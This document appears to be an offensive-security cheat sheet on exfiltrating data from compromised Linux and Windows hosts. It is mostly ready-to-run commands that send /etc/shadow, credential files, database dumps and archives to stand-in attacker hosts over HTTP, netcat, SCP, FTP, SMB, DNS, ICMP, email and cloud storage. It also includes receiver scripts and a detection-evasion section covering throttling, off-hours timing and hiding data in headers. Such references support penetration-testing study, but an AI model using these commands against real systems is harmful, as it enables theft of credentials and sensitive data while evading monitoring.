# Data Exfiltration (Theft)

### Overview

**Data Exfiltration** is the unauthorized transfer of data from a compromised system to an attacker-controlled location. After gaining access and escalating privileges, attackers extract sensitive files, credentials, databases, and configuration data. Effective exfiltration requires understanding available protocols, evading detection, and handling large datasets efficiently.

**Key Concepts:**

* **Exfiltration Channels** - Methods to transfer data (HTTP, DNS, ICMP, SMB)
* **Encoding** - Obfuscating data to evade detection (base64, hex)
* **Compression** - Reducing file size for faster transfer
* **Encryption** - Protecting data in transit
* **Living off the Land** - Using built-in system tools

**Common Targets:**

* Credentials and password files
* SSH keys and certificates
* Database dumps
* Source code and intellectual property
* Configuration files
* Email archives
* Browser data and cookies

***

### Exploitation Workflow Summary

1. Target Identification ├─ Locate sensitive files ├─ Determine file sizes ├─ Assess network egress filtering └─ Choose exfiltration method
2. Data Preparation ├─ Compress files ├─ Encrypt if needed ├─ Split large files └─ Encode for transfer
3. Exfiltration ├─ Establish transfer channel ├─ Upload/download data ├─ Verify integrity └─ Clean up artifacts
4. Post-Exfiltration ├─ Decompress/decrypt ├─ Analyze stolen data └─ Remove traces on target

***

### Linux Exfiltration

#### HTTP/HTTPS Methods

**Using curl:**

```bash
# Upload file
curl -X POST -F "file=@/etc/shadow" http://attacker-ip:8000/upload

# With authentication
curl -u user:pass -X POST -F "file=@data.tar.gz" https://attacker-ip/upload

# Multiple files
curl -F "file1=@/etc/passwd" -F "file2=@/etc/shadow" http://attacker-ip:8000/
```

**Using wget:**

```bash
# POST file
wget --post-file=/etc/shadow http://attacker-ip:8000/

# With headers
wget --header="Content-Type: application/octet-stream" --post-file=data.zip http://attacker-ip/upload
```

**Python HTTP server (attacker):**

```bash
# Simple receiver
python3 -m http.server 8000

# With upload capability
python3 -c "import http.server; import socketserver; PORT = 8000; Handler = http.server.SimpleHTTPRequestHandler; httpd = socketserver.TCPServer(('', PORT), Handler); httpd.serve_forever()"
```

**Python upload script (attacker):**

```python
# upload_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = self.headers.get('Filename', 'uploaded_file')
        with open(filename, 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Upload successful')

httpd = HTTPServer(('0.0.0.0', 8000), UploadHandler)
httpd.serve_forever()
```

**Exfiltrate with custom header:**

```bash
curl -H "Filename: shadow.txt" --data-binary @/etc/shadow http://attacker-ip:8000/
```

#### SCP/SFTP

**SCP:**

```bash
# Copy file to attacker
scp /etc/shadow user@attacker-ip:/tmp/

# Copy directory recursively
scp -r /var/www/html user@attacker-ip:/tmp/exfil/

# Using SSH key
scp -i /tmp/key.pem /etc/shadow user@attacker-ip:/tmp/
```

**SFTP:**

```bash
sftp user@attacker-ip
put /etc/shadow
put -r /var/www/html/
bye
```

#### Netcat

**On attacker:**

```bash
nc -lvnp 4444 > received_file.tar.gz
```

**On target:**

```bash
cat data.tar.gz | nc attacker-ip 4444

# Or with tar streaming
tar czf - /var/www | nc attacker-ip 4444
```

**Reverse transfer:**

```bash
# On target (receiver)
nc -lvnp 4444 > received_file

# On attacker (sender)
nc target-ip 4444 < file_to_send
```

#### Base64 Encoding

**Encode and exfiltrate:**

```bash
# Encode
base64 /etc/shadow | curl -X POST --data-binary @- http://attacker-ip:8000/

# Encode and send via DNS (small files)
base64 /etc/passwd | while read line; do dig $line.attacker-domain.com; done
```

**On attacker - decode:**

```bash
base64 -d received.b64 > shadow
```

#### DNS Exfiltration

**Using dig:**

```bash
# Exfiltrate via DNS queries
cat /etc/passwd | xxd -p | fold -w 32 | while read line; do dig $line.data.attacker-domain.com; done
```

**Using nslookup:**

```bash
nslookup $(cat /etc/hostname).attacker-domain.com attacker-nameserver
```

**DNS listener (attacker):**

```bash
# tcpdump
sudo tcpdump -i eth0 -n port 53

# dnsmasq
sudo dnsmasq -d -q
```

#### ICMP Exfiltration

**Using ping:**

```bash
# Encode data in ping packets
xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line attacker-ip; done
```

**ICMP listener (attacker):**

```bash
sudo tcpdump -i eth0 icmp -n -X
```

#### Archive and Compress

**Tar with compression:**

```bash
tar czf data.tar.gz /var/www/html /etc/apache2 /home/user

# Exclude unnecessary files
tar czf data.tar.gz --exclude='*.log' --exclude='cache' /var/www/
```

**Create encrypted archive:**

```bash
tar czf - /sensitive/data | openssl enc -aes-256-cbc -salt -k "password123" > data.tar.gz.enc
```

**Split large files:**

```bash
split -b 10M largefile.tar.gz chunk_

# Results: chunk_aa, chunk_ab, chunk_ac, etc.
```

**Reassemble on attacker:**

```bash
cat chunk_* > largefile.tar.gz
```

#### FTP

**Anonymous FTP upload:**

```bash
ftp attacker-ip
# Username: anonymous
# Password: [enter]
put /etc/shadow
bye
```

**Automated FTP:**

```bash
cat > ftp_script.txt <<EOF
open attacker-ip
user username password
binary
put /etc/shadow
bye
EOF

ftp -n < ftp_script.txt
```

#### SMB

**Mount and copy:**

```bash
# Mount attacker's SMB share
mkdir /mnt/exfil
mount -t cifs //attacker-ip/share /mnt/exfil -o username=user,password=pass

# Copy files
cp -r /var/www/html /mnt/exfil/

# Unmount
umount /mnt/exfil
```

**Using smbclient:**

```bash
smbclient //attacker-ip/share -U user%pass -c "put /etc/shadow shadow.txt"
```

***

### Windows Exfiltration

#### PowerShell Methods

**Upload via HTTP POST:**

```powershell
$file = Get-Content "C:\sensitive\data.txt" -Raw
Invoke-RestMethod -Uri "http://attacker-ip:8000/upload" -Method POST -Body $file
```

**Upload file as multipart:**

```powershell
$file = "C:\Users\Admin\Desktop\passwords.txt"
$uri = "http://attacker-ip:8000/upload"
$form = @{file = Get-Item -Path $file}
Invoke-RestMethod -Uri $uri -Method POST -Form $form
```

**Download to attacker (WebDAV):**

```powershell
copy C:\sensitive\data.txt \\attacker-ip\webdav\data.txt
```

**Base64 encode and POST:**

```powershell
$content = [System.IO.File]::ReadAllBytes("C:\file.zip")
$base64 = [System.Convert]::ToBase64String($content)
Invoke-RestMethod -Uri "http://attacker-ip:8000/" -Method POST -Body $base64
```

#### Certutil

**Download (commonly used, also works for upload):**

```cmd
certutil -urlcache -f http://attacker-ip/file.txt C:\file.txt
```

**Encode and exfiltrate:**

```cmd
certutil -encode C:\sensitive.txt encoded.b64
type encoded.b64 | certutil -urlcache -f http://attacker-ip:8000/upload
```

#### BITSAdmin

**Upload file:**

```cmd
bitsadmin /transfer myDownload /download /priority high http://attacker-ip:8000/ C:\exfil\data.zip

bitsadmin /transfer myUpload /upload /priority high http://attacker-ip:8000/upload C:\sensitive\data.txt
```

#### SMB

**Copy to attacker's SMB share:**

```cmd
copy C:\sensitive\data.txt \\attacker-ip\share\data.txt

xcopy /s /e C:\Users\Admin\Documents \\attacker-ip\share\docs\
```

**Using net use:**

```cmd
net use Z: \\attacker-ip\share /user:username password
copy C:\sensitive\data.txt Z:\
net use Z: /delete
```

#### FTP

**Windows FTP script:**

```cmd
echo open attacker-ip > ftp.txt
echo user username password >> ftp.txt
echo binary >> ftp.txt
echo put C:\data.zip >> ftp.txt
echo bye >> ftp.txt

ftp -s:ftp.txt
del ftp.txt
```

#### BITS

**PowerShell BITS transfer:**

```powershell
Start-BitsTransfer -Source "C:\sensitive\data.zip" -Destination "http://attacker-ip:8000/upload" -TransferType Upload
```

#### DNS Exfiltration

**PowerShell DNS:**

```powershell
$data = Get-Content "C:\passwords.txt"
$data | ForEach-Object {
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_))
    Resolve-DnsName "$encoded.attacker-domain.com" -Server attacker-nameserver
}
```

#### Archive and Compress

**Using built-in compression:**

```powershell
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\data.zip
```

**7-Zip (if available):**

```cmd
"C:\Program Files\7-Zip\7z.exe" a -tzip -pPassword123 C:\data.zip C:\sensitive\*
```

**RAR (if available):**

```cmd
"C:\Program Files\WinRAR\Rar.exe" a -hpPassword123 C:\data.rar C:\sensitive\*
```

#### Email Exfiltration

**PowerShell send email:**

```powershell
$attachment = "C:\sensitive\data.zip"
$smtp = "smtp.gmail.com"
$from = "compromised@victim.com"
$to = "attacker@evil.com"
$subject = "Data Export"
$body = "Automated export"

Send-MailMessage -From $from -To $to -Subject $subject -Body $body -Attachments $attachment -SmtpServer $smtp -Port 587 -UseSsl -Credential (Get-Credential)
```

#### RDP Clipboard

**Copy to clipboard and paste on attacker RDP session:**

```powershell
Get-Content C:\passwords.txt | Set-Clipboard
```

#### Alternative Data Streams (ADS)

**Hide data in ADS, then exfiltrate:**

```cmd
type C:\sensitive.txt > C:\Windows\System32\calc.exe:hidden.txt

# Exfiltrate
more < C:\Windows\System32\calc.exe:hidden.txt
```

***

### Advanced Techniques

#### Encrypted Exfiltration

**OpenSSL (Linux):**

```bash
tar czf - /sensitive | openssl enc -aes-256-cbc -pbkdf2 -salt -out data.enc
curl --data-binary @data.enc http://attacker-ip:8000/
```

**Decrypt on attacker:**

```bash
openssl enc -aes-256-cbc -pbkdf2 -d -in data.enc | tar xzf -
```

**GPG encryption (Linux):**

```bash
tar czf - /sensitive | gpg -c --cipher-algo AES256 | curl --data-binary @- http://attacker-ip:8000/
```

**PowerShell AES encryption (Windows):**

```powershell
$key = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes("password"))
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key

# Encrypt and send
$encrypted = $aes.CreateEncryptor().TransformFinalBlock([System.IO.File]::ReadAllBytes("C:\data.txt"), 0, (Get-Item "C:\data.txt").Length)
Invoke-RestMethod -Uri "http://attacker-ip:8000/" -Method POST -Body $encrypted
```

#### Steganography

**Hide data in image (Linux):**

```bash
steghide embed -cf image.jpg -ef secret.txt -p password123
curl -F "file=@image.jpg" http://attacker-ip:8000/
```

**Extract on attacker:**

```bash
steghide extract -sf image.jpg -p password123
```

#### Cloud Storage

**Upload to attacker's cloud storage:**

```bash
# AWS S3
aws s3 cp /sensitive/data.zip s3://attacker-bucket/

# Azure
az storage blob upload --account-name attacker --container exfil --file /sensitive/data.zip

# Google Drive (using rclone)
rclone copy /sensitive/data.zip remote:exfil/
```

**Windows - OneDrive:**

```powershell
Copy-Item "C:\sensitive\data.zip" "$env:OneDrive\exfil\"
```

#### Database Dumps

**MySQL:**

```bash
mysqldump -u root -p database_name > dump.sql
curl --data-binary @dump.sql http://attacker-ip:8000/
```

**PostgreSQL:**

```bash
pg_dump -U postgres database_name > dump.sql
curl --data-binary @dump.sql http://attacker-ip:8000/
```

**SQLite:**

```bash
sqlite3 database.db .dump > dump.sql
curl --data-binary @dump.sql http://attacker-ip:8000/
```

**MSSQL (Windows):**

```powershell
sqlcmd -S localhost -Q "BACKUP DATABASE [DB_NAME] TO DISK='C:\backup.bak'"
Copy-Item "C:\backup.bak" "\\attacker-ip\share\"
```

***

### Detection Evasion

#### Slow Exfiltration

**Throttled transfer:**

```bash
# Transfer slowly (1KB/s)
pv -L 1k /etc/shadow | nc attacker-ip 4444

# With random delays
while read line; do echo "$line" | nc attacker-ip 4444; sleep $(($RANDOM % 10)); done < /etc/shadow
```

#### Time-Based Exfiltration

**Transfer during specific hours:**

```bash
hour=$(date +%H)
if [ $hour -ge 22 ] || [ $hour -le 6 ]; then
    curl -F "file=@/sensitive/data.zip" http://attacker-ip:8000/
fi
```

#### Protocol Blending

**Hide in legitimate traffic:**

```bash
# Exfiltrate in User-Agent header
data=$(base64 /etc/shadow | head -c 100)
curl -A "Mozilla/5.0 $data" http://attacker-ip/
```

#### Split and Scatter

**Split across multiple channels:**

```bash
# Split file
split -b 1M sensitive.zip chunk_

# Send via different methods
curl -F "file=@chunk_aa" http://attacker-ip:8000/
nc attacker-ip 4444 < chunk_ab
scp chunk_ac user@attacker-ip:/tmp/
```

***

### Quick Reference

**Linux HTTP:**

```bash
curl -F "file=@/etc/shadow" http://attacker-ip:8000/
wget --post-file=/etc/shadow http://attacker-ip:8000/
```

**Linux Netcat:**

```bash
# Attacker
nc -lvnp 4444 > file

# Target
nc attacker-ip 4444 < file
```

**Linux SCP:**

```bash
scp /etc/shadow user@attacker-ip:/tmp/
scp -r /var/www user@attacker-ip:/tmp/
```

**Windows PowerShell:**

```powershell
Invoke-RestMethod -Uri "http://attacker-ip:8000/" -Method POST -InFile "C:\data.txt"
Copy-Item "C:\data.txt" "\\attacker-ip\share\"
```

**Windows Certutil:**

```cmd
certutil -encode C:\file.txt encoded.b64
certutil -urlcache -f http://attacker-ip/file.txt
```

**Compression:**

```bash
# Linux
tar czf data.tar.gz /path/to/data

# Windows
Compress-Archive -Path C:\data -DestinationPath C:\data.zip
```

**Encryption:**

```bash
# Linux
openssl enc -aes-256-cbc -salt -in file -out file.enc

# Windows
# Use built-in or third-party tool
```
